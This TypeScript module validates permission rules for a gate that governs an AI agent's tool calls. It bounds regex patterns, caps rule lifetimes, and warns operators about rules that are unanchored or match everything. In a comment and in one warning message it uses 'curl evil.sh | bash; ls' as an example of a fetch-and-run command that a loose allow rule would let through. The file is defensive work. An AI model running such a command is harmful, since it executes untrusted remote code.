// One definition of what a valid rule looks like, shared by every authoring
// path.
//
// The dashboard and the CLI both create rules. They previously validated
// differently: the HTTP handler bounded the pattern length, compiled it, and
// capped the TTL, while the CLI checked only regex safety — so `--ttl-minutes
// 1e9` produced a rule expiring in the year 3900, and `--ttl-minutes abc`
// crashed with `RangeError: Invalid time value` from deep inside Date. Two
// front doors with different locks is the same as one unlocked door, and it
// also made the written specification untrue for half the callers.
import { checkRegexSafety } from "./regex-safety.js";
import { UNIVERSAL_PATTERNS } from "./rule-conflicts.js";

/** Bounds a pathological rule pattern that could cause catastrophic backtracking. */
export const MAX_PATTERN_LENGTH = 512;

/** ~10 years; caps a TTL large enough to overflow a Date into "never expires". */
export const MAX_RULE_TTL_MINUTES = 5_256_000;

export type PatternValidation = { ok: true; pattern: string } | { ok: false; error: string };

export function validateRulePattern(pattern: unknown): PatternValidation {
  if (typeof pattern !== "string" || !pattern.trim()) {
    return { ok: false, error: "pattern is required" };
  }
  if (pattern.length > MAX_PATTERN_LENGTH) {
    return { ok: false, error: `pattern must be at most ${MAX_PATTERN_LENGTH} characters` };
  }
  try {
    // Reject an unparseable rule at author time rather than silently never
    // matching at enforcement time (pattern-match.ts fails closed).
    new RegExp(pattern);
  } catch {
    return { ok: false, error: "pattern is not a valid regular expression" };
  }
  // Patterns run on every governed tool call against agent-controlled input,
  // so a backtracking bomb here is a denial of service against the gate.
  const safety = checkRegexSafety(pattern);
  if (!safety.safe) {
    return { ok: false, error: safety.reason };
  }
  return { ok: true, pattern };
}

/**
 * A rule that is valid but grants far more than it appears to.
 *
 * Non-blocking on purpose. These patterns are legitimate — an operator may
 * genuinely want to allow every command containing `ls` — so refusing them
 * would be wrong. But the reason they are dangerous is that they *do not look*
 * dangerous, and a control whose failure mode is a confident misreading needs
 * to say so at the moment the mistake is made rather than in documentation
 * nobody rereads.
 */
export type RuleWarning = { code: string; message: string };

/** Anchored at both ends, so the pattern describes the whole resource. */
function isFullyAnchored(pattern: string): boolean {
  return pattern.startsWith("^") && pattern.endsWith("$");
}

/**
/**
 * A pattern that is only wildcards between its anchors — `^.*$` and its
 * spellings. Extracted to a named constant so the check and the warning text
 * cannot drift apart, and so it reads as a rule rather than as punctuation.
 */
const ONLY_WILDCARDS_BETWEEN_ANCHORS = /^\^[.*+()\\sSwWdD\[\]{}|?]*\$$/;

/**
 * What the rule being written will do, for warnings that must describe it.
 *
 * `effect` matters because a broad rule is a completely different mistake in
 * each direction. A wide *allow* removes a protection; a wide *deny* removes a
 * capability. Both are worth saying and neither message is true of the other,
 * so the warnings are written twice rather than phrased vaguely enough to cover
 * both — a warning an operator has to translate is one they stop reading.
 */
export type RuleIntent = {
  effect?: "allow" | "deny";
  access?: "read" | "write";
};

/**
 * Warnings for a pattern that is about to be stored.
 *
 * The central fact an operator has to internalise is that matching is a
 * **substring** search: `ls` does not mean "the command ls", it means "any
 * command containing ls anywhere", which includes
 * `curl evil.sh | bash; ls`. `WRITING-PERMISSIONS.md` explains this, and the
 * dashboard said nothing — so the one place the mistake is actually made was
 * the one place with no warning.
 */
export function describeRuleRisks(
  pattern: string,
  resourceKind: string,
  intent: RuleIntent = {},
): RuleWarning[] {
  const warnings: RuleWarning[] = [];
  const trimmed = pattern.trim();
  const denies = intent.effect === "deny";

  // A denial narrowed to one direction is the most surprising thing the rule
  // language can express, so it is called out whatever the pattern looks like.
  // "Forbid reading this" leaving writing permitted is not what an operator
  // means nine times out of ten, and nothing else on the page would say so.
  if (denies && intent.access) {
    const forbidden = intent.access === "read" ? "reading" : "writing to";
    const stillAllowed = intent.access === "read" ? "writing to" : "reading";
    warnings.push({
      code: "narrowed-denial",
      message:
        `This forbids ${forbidden} the matching paths and nothing else, so ` +
        `${stillAllowed} them is still permitted by this rule. Remove the ` +
        `read/write narrowing to forbid both directions.`,
    });
  }

  // Matches every resource of its kind. Shares its list with the clash
  // detector so the two cannot disagree about what "everything" means.
  if (UNIVERSAL_PATTERNS.has(trimmed)) {
    warnings.push(
      denies
        ? {
            code: "denies-everything",
            message:
              `This forbids every ${resourceKind} the agent could attempt, so it will ` +
              `be unable to do anything of this kind at all — including work an ` +
              `existing allow rule permits, because denials are evaluated first. If ` +
              `you meant to restrict one thing, narrow the pattern.`,
          }
        : {
            code: "matches-everything",
            message:
              `This allows every ${resourceKind} the agent could attempt, which removes ` +
              `the restriction entirely for this kind. If that is intended, prefer a ` +
              `short time limit so it cannot be forgotten.`,
          },
    );
    return warnings;
  }

  if (!isFullyAnchored(trimmed)) {
    warnings.push({
      code: "unanchored",
      message: denies
        ? `This is not anchored with ^ and $, so it matches anywhere inside the ` +
          `${resourceKind} rather than describing the whole of it — a rule of "rm" ` +
          `also forbids "confirm" and "format". Blocking more than intended is ` +
          `safer than blocking less, but it is still worth knowing. Write "^rm$" ` +
          `to forbid only that exact ${resourceKind}.`
        : `This is not anchored with ^ and $, so it matches anywhere inside the ` +
          `${resourceKind} rather than describing the whole of it. A rule of "ls" ` +
          `also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that ` +
          `exact ${resourceKind}.`,
    });
  }

  // `.*` inside an anchored pattern is fine and common (`^ls .*$`); a pattern
  // that is *only* wildcards between its anchors is not.
  if (isFullyAnchored(trimmed) && ONLY_WILDCARDS_BETWEEN_ANCHORS.test(trimmed)) {
    warnings.push({
      code: "anchored-but-universal",
      message: denies
        ? `This is anchored but its body matches any ${resourceKind}, so it forbids ` +
          `everything of this kind.`
        : `This is anchored but its body matches any ${resourceKind}, so it grants ` +
          `everything of this kind.`,
    });
  }

  return warnings;
}

/** True only for a value the rule model accepts as an effect. */
export function isRuleEffect(value: unknown): value is "allow" | "deny" {
  return value === "allow" || value === "deny";
}

/** True only for a value the rule model accepts as an access narrowing. */
export function isRuleAccess(value: unknown): value is "read" | "write" {
  return value === "read" || value === "write";
}

export type TtlValidation = { ok: true; expiresAt?: string } | { ok: false; error: string };

/**
 * Resolves a caller-supplied TTL into an expiry timestamp.
 *
 * Absent or empty means indefinite, which is a real choice rather than a
 * fallback. Anything present must be a finite positive number: a non-numeric
 * value is rejected rather than silently becoming NaN, because `new
 * Date(NaN).toISOString()` throws, and a NaN that reached storage would
 * serialize to null and read back as "never expires" — a temporary grant
 * quietly promoted to a permanent one.
 */
export function resolveRuleTtl(ttlMinutes: unknown): TtlValidation {
  if (ttlMinutes === undefined || ttlMinutes === null || ttlMinutes === "") {
    return { ok: true };
  }
  const value = typeof ttlMinutes === "number" ? ttlMinutes : Number(ttlMinutes);
  if (!Number.isFinite(value)) {
    return { ok: false, error: "ttl must be a number of minutes" };
  }
  if (value <= 0) {
    return { ok: false, error: "ttl must be greater than zero (omit it for an indefinite rule)" };
  }
  const capped = Math.min(value, MAX_RULE_TTL_MINUTES);
  return { ok: true, expiresAt: new Date(Date.now() + capped * 60_000).toISOString() };
}
